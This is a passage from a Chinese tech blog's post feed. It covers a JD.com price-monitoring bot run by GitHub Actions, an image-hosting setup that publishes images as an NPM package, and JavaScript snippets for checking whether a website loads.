class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 